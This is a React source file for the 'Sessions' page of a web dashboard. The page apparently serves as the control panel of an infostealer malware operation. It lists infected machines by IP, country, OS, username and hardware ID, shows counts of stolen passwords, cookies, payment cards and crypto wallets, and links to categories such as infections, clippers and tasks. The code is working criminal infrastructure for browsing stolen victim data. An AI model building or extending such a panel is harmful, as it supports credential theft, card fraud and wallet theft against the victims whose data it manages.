import { useState, useMemo, useEffect } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import { useQuery, keepPreviousData } from '@tanstack/react-query'
import { useI18n } from '@/lib/i18n'
import {
  useTable,
  tableFeatures,
  rowPaginationFeature,
  rowSortingFeature,
  createColumnHelper,
} from '@tanstack/react-table'
import type { SortingState, PaginationState } from '@tanstack/react-table'
import { formatDistanceToNow } from 'date-fns'
import { ChevronLeft, ChevronRight, Search, Settings2, Eye, EyeOff } from 'lucide-react'
import { api } from '@/lib/api'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table'
import { Skeleton } from '@/components/ui/skeleton'
import { FlagIcon } from '@/components/charts/flag-icon'
import {
  DropdownMenu,
  DropdownMenuTrigger,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
} from '@/components/ui/dropdown-menu'
import type { SessionListItem, SessionPage } from '@/types'

const features = tableFeatures({
  rowSortingFeature,
  rowPaginationFeature,
})

type F = typeof features
const columnHelper = createColumnHelper<F, SessionListItem>()


function getDateRange(preset: string): { from?: string; to?: string } {
  const now = new Date()
  const y = now.getFullYear()
  const m = String(now.getMonth() + 1).padStart(2, '0')
  const d = String(now.getDate()).padStart(2, '0')
  const today = `${y}-${m}-${d}`
  if (preset === 'today') return { from: today }
  if (preset === 'yesterday') {
    const yest = new Date(now)
    yest.setDate(yest.getDate() - 1)
    return { from: `${yest.getFullYear()}-${String(yest.getMonth() + 1).padStart(2, '0')}-${String(yest.getDate()).padStart(2, '0')}` }
  }
  if (preset === '7d') {
    const d7 = new Date(now)
    d7.setDate(d7.getDate() - 7)
    return { from: `${d7.getFullYear()}-${String(d7.getMonth() + 1).padStart(2, '0')}-${String(d7.getDate()).padStart(2, '0')}` }
  }
  if (preset === '30d') {
    const d30 = new Date(now)
    d30.setDate(d30.getDate() - 30)
    return { from: `${d30.getFullYear()}-${String(d30.getMonth() + 1).padStart(2, '0')}-${String(d30.getDate()).padStart(2, '0')}` }
  }
  return {}
}

export default function Sessions() {
  const navigate = useNavigate()
  const location = useLocation()
  const { t } = useI18n()

  const COUNTRY_OPTIONS = [
    { value: '', label: t('sessions.all_countries') },
    { value: 'RU', label: 'Russia' },
    { value: 'US', label: 'United States' },
    { value: 'BR', label: 'Brazil' },
    { value: 'IN', label: 'India' },
    { value: 'DE', label: 'Germany' },
    { value: 'GB', label: 'United Kingdom' },
    { value: 'FR', label: 'France' },
    { value: 'CN', label: 'China' },
  ]

  const DATE_PRESETS = [
    { value: '', label: t('sessions.all_time') },
    { value: 'today', label: t('sessions.today') },
    { value: 'yesterday', label: t('sessions.yesterday') },
    { value: '7d', label: t('sessions.last_7d') },
    { value: '30d', label: t('sessions.last_30d') },
  ]
  const pathSegment = location.pathname.split('/').filter(Boolean)[0] || ''
  const category = pathSegment
  const isComingSoon = category === 'clippers' || category === 'tasks'
  const apiType = ({ passwords: 'password', cookies: 'cookie', cards: 'card', wallets: 'wallet', files: 'file' } as Record<string, string>)[category] ?? ''
  const [search, setSearch] = useState('')
  const [debouncedSearch, setDebouncedSearch] = useState('')
  const [countryFilter, setCountryFilter] = useState('')
  const [datePreset, setDatePreset] = useState('')
  const [emptyOnly, setEmptyOnly] = useState(false)
  const [blurred, setBlurred] = useState(false)
  const [visibleColumns, setVisibleColumns] = useState<Record<string, boolean>>(() => {
    const saved = localStorage.getItem('session_columns')
    if (saved) {
      try { return JSON.parse(saved) } catch {}
    }
    return {
      ip: true, country: true, os: true, username: true, hwid: true,
      passwords: true, cookies: true, cards: true, wallets: true, created_at: true,
    }
  })
  const [sorting, setSorting] = useState<SortingState>([{ id: 'created_at', desc: true }])
  const [pagination, setPagination] = useState<PaginationState>({ pageIndex: 0, pageSize: 50 })

  useEffect(() => {
    const timer = setTimeout(() => setDebouncedSearch(search), 300)
    return () => clearTimeout(timer)
  }, [search])

  const sort = sorting.length > 0
    ? `${sorting[0].desc ? '-' : ''}${sorting[0].id}`
    : '-created_at'

  useEffect(() => {
    setPagination(prev => ({ ...prev, pageIndex: 0 }))
  }, [sort, countryFilter, debouncedSearch, datePreset, emptyOnly, apiType])

  const dateRange = useMemo(() => getDateRange(datePreset), [datePreset])

  const query = useQuery<SessionPage>({
    queryKey: ['sessions', pagination.pageIndex + 1, pagination.pageSize, sort, debouncedSearch, countryFilter, datePreset, emptyOnly, apiType],
    queryFn: () => api.get<SessionPage>('/api/sessions', {
      page: pagination.pageIndex + 1,
      limit: pagination.pageSize,
      sort,
      q: debouncedSearch || undefined,
      country: countryFilter || undefined,
      date_from: dateRange.from,
      date_to: dateRange.to,
      empty_only: emptyOnly || undefined,
      type: apiType || undefined,
    }),
    placeholderData: keepPreviousData,
  })

  const data = query.data

  const columns = useMemo(() => columnHelper.columns([
    columnHelper.display({
      id: 'row',
      header: '#',
      cell: ({ row }) => row.index + 1 + pagination.pageIndex * pagination.pageSize,
    }),
    columnHelper.accessor('ip', {
      id: 'ip',
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          {t('table.ip')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
      cell: ({ getValue }) => {
        const v = getValue()
        return <span className={blurred ? 'blur-sm select-none' : ''}>{v}</span>
      },
    }),
    columnHelper.accessor('country_code', {
      id: 'country',
      header: t('table.country'),
      enableSorting: true,
      cell: ({ getValue }) => {
        const v = getValue()
        return (
          <div className={`flex items-center gap-1.5 ${blurred ? 'blur-sm select-none' : ''}`}>
            <FlagIcon country={v ?? ''} />
            <span className="font-mono text-xs">{v}</span>
          </div>
        )
      },
    }),
    columnHelper.accessor('os', {
      id: 'os',
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          {t('table.os')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('username', { id: 'username', header: t('table.username') }),
    columnHelper.accessor('hwid', {
      id: 'hwid',
      header: t('table.hwid'),
      cell: ({ getValue }) => {
        const v = getValue()
        return v ? <span className="font-mono text-xs">{v.slice(0, 16)}…</span> : '-'
      },
    }),
    columnHelper.accessor('passwords_count', {
      id: 'passwords',
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          {t('session.passwords')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('cookies_count', {
      id: 'cookies',
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          {t('session.cookies')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('cards_count', {
      id: 'cards',
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          {t('session.cards')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('wallets_count', {
      id: 'wallets',
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          {t('session.wallets')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('created_at', {
      id: 'created_at',
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          {t('common.created')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
      cell: ({ getValue }) => formatDistanceToNow(new Date(getValue()), { addSuffix: true }),
    }),
  ]), [pagination.pageIndex, pagination.pageSize, blurred])

  const visibleCols = useMemo(
    () => columns.filter(c => visibleColumns[c.id ?? ''] ?? true),
    [columns, visibleColumns]
  )

  const toggleColumn = (id: string) => {
    setVisibleColumns(prev => {
      const next = { ...prev, [id]: !prev[id] }
      localStorage.setItem('session_columns', JSON.stringify(next))
      return next
    })
  }

  const table = useTable({
    features,
    data: data?.sessions ?? [],
    columns: visibleCols,
    state: { sorting, pagination },
    onSortingChange: setSorting,
    onPaginationChange: setPagination,
    manualSorting: true,
    manualPagination: true,
    pageCount: data?.pages ?? -1,
    rowCount: data?.total ?? 0,
  })

  if (isComingSoon) {
    return (
      <div className="space-y-4">
        <h1 className="text-2xl font-semibold tracking-tight">{t(`nav.${category}` as any)}</h1>
        <div className="flex flex-col items-center justify-center h-[40vh] gap-4">
          <p className="text-lg text-muted-foreground">This feature is coming soon</p>
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-semibold tracking-tight">{(['passwords','cookies','cards','wallets','files','infections','clippers','tasks'] as string[]).includes(category) ? t(`nav.${category}` as any) : t('sessions.title')}</h1>
        <div className="flex items-center gap-2">
          <select
            value={datePreset}
            onChange={(e) => setDatePreset(e.target.value)}
            className="h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
          >
            {DATE_PRESETS.map(opt => (
              <option key={opt.value} value={opt.value}>{opt.label}</option>
            ))}
          </select>
          <div className="relative">
            <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
            <Input
              placeholder={t("sessions.search")}
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="max-w-xs pl-8"
            />
          </div>
          <select
            value={countryFilter}
            onChange={(e) => setCountryFilter(e.target.value)}
            className="h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
          >
            {COUNTRY_OPTIONS.map(opt => (
              <option key={opt.value} value={opt.value}>{opt.label}</option>
            ))}
          </select>
          <Button
            variant="outline"
            size="sm"
            onClick={() => setEmptyOnly(!emptyOnly)}
            className={emptyOnly ? 'bg-primary/10' : ''}
          >
            {emptyOnly ? t('sessions.show_all') : t('sessions.hide_empty')}
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => setBlurred(!blurred)}
            className={blurred ? 'bg-primary/10' : ''}
          >
            {blurred ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
          </Button>
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant="outline" size="sm">
                <Settings2 className="h-4 w-4" />
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align="end" className="w-44">
              <DropdownMenuLabel>{t('sessions.columns')}</DropdownMenuLabel>
              <DropdownMenuSeparator />
              {Object.entries(visibleColumns).map(([key, visible]) => (
                <DropdownMenuItem key={key} onClick={() => toggleColumn(key)}>
                  <div className="flex items-center gap-2 w-full">
                    <input type="checkbox" checked={visible} readOnly className="rounded" aria-label={key} />
                    <span>{key.charAt(0).toUpperCase() + key.slice(1)}</span>
                  </div>
                </DropdownMenuItem>
              ))}
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </div>

      {query.isLoading && !query.data ? (
        <Skeleton className="h-96" />
      ) : (
        <>
          <div className="rounded-md border">
            <Table>
              <TableHeader>
                {table.getHeaderGroups().map(headerGroup => (
                  <TableRow key={headerGroup.id}>
                    {headerGroup.headers.map(header => (
                      <TableHead key={header.id}>
                        <table.FlexRender header={header} />
                      </TableHead>
                    ))}
                  </TableRow>
                ))}
              </TableHeader>
              <TableBody>
                {table.getRowModel().rows.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={visibleCols.length} className="h-24 text-center text-muted-foreground">
                      {query.isFetching ? t('common.loading') : t('sessions.no_sessions')}
                    </TableCell>
                  </TableRow>
                ) : (
                  table.getRowModel().rows.map(row => (
                    <TableRow
                      key={row.id}
                      className="cursor-pointer"
                      onClick={() => navigate(`/sessions/${row.original.id}`)}
                    >
                      {row.getAllCells().map(cell => (
                        <TableCell key={cell.id}>
                          <table.FlexRender cell={cell} />
                        </TableCell>
                      ))}
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>

          <div className="flex items-center justify-between">
            <p className="text-sm text-muted-foreground tabular-nums">
              {data
                ? t('sessions.showing', { a: data.sessions.length, b: data.total.toLocaleString() })
                : t('common.loading')}
            </p>
            <div className="flex items-center gap-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => table.previousPage()}
                disabled={!table.getCanPreviousPage()}
              >
                <ChevronLeft className="h-4 w-4" />
              </Button>
              <span className="text-sm tabular-nums">
                Page {data ? data.page : '?'} of {data ? data.pages : '?'}
              </span>
              <Button
                variant="outline"
                size="sm"
                onClick={() => table.nextPage()}
                disabled={!table.getCanNextPage()}
              >
                <ChevronRight className="h-4 w-4" />
              </Button>
            </div>
          </div>
        </>
      )}
    </div>
  )
}
